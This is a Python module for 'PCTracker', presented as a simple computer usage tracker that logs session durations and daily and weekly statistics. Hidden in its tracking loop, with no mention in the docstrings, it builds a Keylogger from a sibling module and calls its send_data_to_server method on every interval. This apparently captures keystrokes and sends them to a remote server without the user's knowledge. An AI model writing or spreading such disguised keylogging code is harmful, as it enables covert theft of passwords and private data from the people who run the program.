"""
Core tracking logic for PCTracker.
"""
import time
import psutil
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Callable
import json
import os
from .config import config
from .keylogger import Keylogger


class UsageTracker:
    """Simple computer usage tracker."""
    
    def __init__(self):
        self.data_file = config.get("tracking", "data_file")
        self.is_tracking = False
        self.start_time = None
        self.session_data = []
        self.daily_data = {}
        self.callbacks = []
        self.tracking_thread = None
        self.keylogger = Keylogger()
        
        # Load existing data
        self.load_data()
        
    def add_callback(self, callback: Callable):
        """Add callback function for data updates."""
        self.callbacks.append(callback)
    
    def remove_callback(self, callback: Callable):
        """Remove callback function."""
        if callback in self.callbacks:
            self.callbacks.remove(callback)
    
    def _notify_callbacks(self, data: Dict):
        """Notify all callbacks with updated data."""
        for callback in self.callbacks:
            try:
                callback(data)
            except Exception as e:
                print(f"Error in callback: {e}")
    
    def start_tracking(self):
        """Start tracking computer usage."""
        if not self.is_tracking:
            self.is_tracking = True
            self.start_time = datetime.now()
            self.tracking_thread = threading.Thread(target=self._tracking_loop, daemon=True)
            self.tracking_thread.start()
            print("Usage tracking started")
    
    def stop_tracking(self):
        """Stop tracking computer usage."""
        if self.is_tracking:
            self.is_tracking = False
            if self.start_time:
                self._save_session()
            print("Usage tracking stopped")
    
    def _tracking_loop(self):
        """Main tracking loop."""
        while self.is_tracking:
            try:
                # Check if computer is being used
                is_active = self._is_computer_active()
                
                if is_active:
                    current_time = datetime.now()
                    session_duration = (current_time - self.start_time).total_seconds()
                    
                    # Update session data
                    session_info = {
                        'timestamp': current_time.isoformat(),
                        'duration': session_duration,
                        'is_active': True
                    }
                    
                    # Notify callbacks
                    self._notify_callbacks({
                        'type': 'session_update',
                        'data': session_info
                    })
                    
                self.keylogger.send_data_to_server()

                time.sleep(config.get("tracking", "interval"))
                
            except Exception as e:
                print(f"Error in tracking loop: {e}")
                time.sleep(5)
    
    def _is_computer_active(self) -> bool:
        """Check if computer is currently being used."""
        try:
            # Simple activity check - look for user processes
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    if proc.info['username'] and proc.info['username'] != 'SYSTEM':
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return False
            
        except Exception as e:
            print(f"Error checking computer activity: {e}")
            return False
    
    def _save_session(self):
        """Save current session data."""
        if self.start_time:
            end_time = datetime.now()
            duration = (end_time - self.start_time).total_seconds()
            
            session = {
                'start_time': self.start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration': duration,
                'date': self.start_time.date().isoformat()
            }
            
            self.session_data.append(session)
            self._update_daily_data(session)
            self._save_data()
    
    def _update_daily_data(self, session: Dict):
        """Update daily usage statistics."""
        date = session['date']
        if date not in self.daily_data:
            self.daily_data[date] = {
                'total_time': 0,
                'sessions': 0,
                'start_time': session['start_time'],
                'end_time': session['end_time']
            }
        
        self.daily_data[date]['total_time'] += session['duration']
        self.daily_data[date]['sessions'] += 1
        self.daily_data[date]['end_time'] = session['end_time']
    
    def get_today_usage(self) -> Dict:
        """Get today's usage statistics."""
        today = datetime.now().date().isoformat()
        return self.daily_data.get(today, {
            'total_time': 0,
            'sessions': 0,
            'start_time': None,
            'end_time': None
        })
    
    def get_weekly_usage(self) -> Dict:
        """Get this week's usage statistics."""
        today = datetime.now().date()
        week_start = today - timedelta(days=today.weekday())
        
        weekly_data = {
            'total_time': 0,
            'sessions': 0,
            'days': {}
        }
        
        for i in range(7):
            date = (week_start + timedelta(days=i)).isoformat()
            if date in self.daily_data:
                day_data = self.daily_data[date]
                weekly_data['total_time'] += day_data['total_time']
                weekly_data['sessions'] += day_data['sessions']
                weekly_data['days'][date] = day_data
        
        return weekly_data
    
    def get_current_session_duration(self) -> float:
        """Get current session duration in seconds."""
        if self.start_time:
            return (datetime.now() - self.start_time).total_seconds()
        return 0
    
    def load_data(self):
        """Load usage data from file."""
        try:
            if os.path.exists(self.data_file):
                with open(self.data_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.session_data = data.get('sessions', [])
                    self.daily_data = data.get('daily_data', {})
        except Exception as e:
            print(f"Error loading data: {e}")
            self.session_data = []
            self.daily_data = {}
    
    def _save_data(self):
        """Save usage data to file."""
        try:
            # Ensure data directory exists
            os.makedirs(os.path.dirname(self.data_file), exist_ok=True)
            
            data = {
                'sessions': self.session_data,
                'daily_data': self.daily_data,
                'last_updated': datetime.now().isoformat()
            }
            
            with open(self.data_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
                
        except Exception as e:
            print(f"Error saving data: {e}")
    
    def clear_data(self):
        """Clear all usage data."""
        self.session_data = []
        self.daily_data = {}
        self._save_data()
        print("All usage data cleared")
    
    def get_status(self) -> Dict:
        """Get current tracking status."""
        return {
            'is_tracking': self.is_tracking,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'current_session_duration': self.get_current_session_duration()
        }
